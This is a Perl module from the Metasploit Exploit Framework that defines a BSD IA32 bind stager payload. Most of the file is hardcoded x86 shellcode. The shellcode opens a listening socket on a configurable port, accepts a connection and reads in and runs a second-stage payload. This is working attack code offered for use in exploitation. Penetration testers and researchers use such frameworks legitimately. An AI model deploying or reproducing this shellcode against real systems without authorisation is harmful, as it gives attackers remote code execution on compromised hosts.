###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/bsd/ia32/stager_sock_bind.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 bind stager for BSD.
#
##
###############

package Msf::PayloadComponent::BSD::ia32::BindStager;

use strict;
use base 'Msf::PayloadComponent::BSD::BindStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'bsd' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LPORT => [ 0x8, 'n' ],
				},
			Payload =>
				"\x6a\x61\x58\x99\x52\x68\x10\x02\xbf\xbf\x89\xe1\x52\x42\x52\x42" .
				"\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" .
				"\x6a\xcd\x80\x52\x53\xb6\x10\x52\xb0\x1e\xcd\x80\x51\x50\x51\x97" .
				"\x6a\x03\x58\xcd\x80\xc3"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
